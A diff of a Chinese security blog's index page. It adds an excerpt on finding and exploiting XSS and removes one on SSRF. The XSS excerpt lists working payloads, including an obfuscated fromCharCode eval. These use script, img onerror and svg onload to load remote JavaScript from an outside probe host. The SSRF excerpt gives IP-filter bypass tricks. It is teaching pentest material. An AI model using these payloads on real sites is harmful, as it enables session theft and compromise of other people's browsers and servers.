@@ -82,6 +82,68 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/xss-use-and-defense/">XSS漏洞挖掘与利用</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-07-15</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/xss">xss</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 XSS的检测  检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测
+手工检测：检测结果准确，但对于大型web来说费时费力
+软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出
+检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出
+1. 手工检测 可得知输出位置: • 输入敏感字符，如“&lt;、&gt;、&quot;、'、()”等，然后在提交后查看html源代码，看这些字符是否被转义。 • 在输出这些字符时，程序可能已经进行了过滤，可以输入“AAAAAA&lt;&gt;&quot;&amp;'()”字符串，然后查找AAAAAA或许比较方便。 无法得知输出位置: 很多web应用程序源码不公开，在测试时不能得知输出位置，比如，有些留言版在留言后必须经过管理员审核才能显示，无法得知数据在后台管理页面处于何种状态，如： 在标签中：&lt;div&gt;XSS Test&lt;/div&gt; 在属性内：&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;XSS Test&quot; /&gt; 这种情况通常采用输入&quot;/&gt;XSS Test来测试。  2. 全自动检测XSS 如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。
+专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(www.domxssscanner.com)。
+一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。
+ 0x01 XSS的挖掘与利用  XSS漏洞挖掘
+反射型XSS： 一般是url参数中的值能够回显到HTML中，且url的参数值没有过滤或过滤不严 存储型XSS： 可以提交内容 提交的内容可被管理员或其他用户看到 提交的内容没有被过滤或过滤不严  XSS漏洞利用 XSS一般就是闭合标签，和SQL注入类似，常见payload如下：
+• &lt;script src='http://b.ioio.pub/xss/probe.js'&gt;&lt;/script&gt; • &lt;img src=x onerror=&quot;s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js'&quot;;&gt; • &lt;svg onload=s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js&gt; • &lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99, 114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59, 115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47, 112,114,111,98,101,46,106,115)) &gt;   0x03 XSS简单示例  反射型xss简单示例: • &lt;?
+    </p>
+
+    
+    <footer>
+        <a href="/posts/xss-use-and-defense/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/xss-basis/">XSS初识</a></h2>
 
         
@@ -567,65 +629,6 @@ DMZ区网段为：172.16.1.0/24  iptables的策略  新建iptables.sh,内容如
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/ssrf/">SSRF</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 0px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-06-30</time>
-            </div>
-
-            
-
-            <div style="padding:2px 5px 2px 0px;">
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/ssrf">ssrf</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 什么是SSRF  &nbsp;&nbsp;&nbsp;&nbsp;SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。
-&nbsp;&nbsp;&nbsp;&nbsp;当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。
- 0x01 SSRF的危害  可以扫描内部网络
-可以构造数据攻击内部主机
- 0x02 漏洞挖掘  其实只要能对外发起网络请求就有可能存在SSRF漏洞。
-1. 从WEB功能上寻找 通过URL分享内容 文件处理、编码处理、转码等服务 在线翻译 通过URL地址加载与下载图片 图片、文章的收藏 设置邮件接收服务器 2. 从URL关键字寻找 share、wap、url、link、src、source、target、u、3g、 display、sourceURl、imageURL、domain...   0x03 漏洞验证  http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png 1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png， 说明不存在SSRF漏洞。 2. firebug看网络连接信息，若没有http://www.baidu.com/img/bd_logo1.png 这个图片请求，则证明图片是aa.com服务端发起的请求，则可能存在SSRF漏洞。   0x04 绕过过滤  有时漏洞利用时会遇到IP限制，可用如下方法绕过：
-* 使用@：http://A.com@10.10.10.10 = 10.10.10.10 * IP地址转换成十进制、八进制：127.0.0.1 = 2130706433 * 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx * 端口绕过：ip后面加一个端口 * xip.io：10.0.0.1.xip.io = 10.0.0.1 www.10.0.0.1.xip.io = 10.0.0.1 mysite.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/ssrf/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -658,6 +661,8 @@ DMZ区网段为：172.16.1.0/24  iptables的策略  新建iptables.sh,内容如
     <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/ajax" title="ajax">ajax(3)</a></li>
+        
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/database" title="database">database(1)</a></li>
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/git" title="git">git(6)</a></li>
         
@@ -776,6 +781,11 @@ DMZ区网段为：172.16.1.0/24  iptables的策略  新建iptables.sh,内容如
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/module" title="module">module</a>
                 <sup>12</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/mongodb" title="mongodb">mongodb</a>
+                <sup>1</sup>
             </p>
         
             <p style="display:inline-block;">
